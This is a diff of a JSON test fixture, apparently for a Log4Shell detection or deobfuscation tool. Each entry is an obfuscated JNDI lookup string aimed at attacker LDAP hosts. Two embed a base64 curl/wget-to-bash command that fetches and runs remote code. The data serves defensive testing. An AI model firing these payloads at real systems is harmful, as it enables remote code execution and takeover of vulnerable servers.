-    "orig": "/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xNjEuMzUuNi44MTo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xNjEuMzUuNi44MTo4MCl8YmFzaA==}",
-    "expected": ""
-  },
-  {
-    "orig": "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xNjEuMzUuNi44MTo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xNjEuMzUuNi44MTo4MCl8YmFzaA==}",
-    "expected": ""
-  },
-  {
-    "orig": "${${lower:${lower:jndi}}:ld${lower:ap}://45.146.164.160:1389/t}",
-    "expected": ""
-  },
-  {
-    "orig": "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://4.${hostName}.c6rtdvcpu892hng6pe90cg56y3ay4pczq.interact.sh/4}",
-    "expected": ""
-  },
-  {
-    "orig": "/api/v1?q=$%7Bjndi:ldap://78.31.71.248:1389/gfwwq7%7D",
-    "expected": ""
-  },
-  {
-    "orig": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://107.181.187.184:83/images.swiftcrypto.com}",
-    "expected": ""
-  },
-  {
-    "orig": "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6sbtqb45qcg14vb3pdgcghtryaynztik.interact.sh}",
-    "expected": ""
-  },
-  {
-    "orig": "/search?a=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
-    "expected": ""
+    "original": "Bearer ${jndi:ldap://45.83.193.150:1389/Exploit}",
+    "expected": "Bearer ${jndi:ldap://45.83.193.150:1389/Exploit}",
+    "deobfusc": ""
   }
 ]
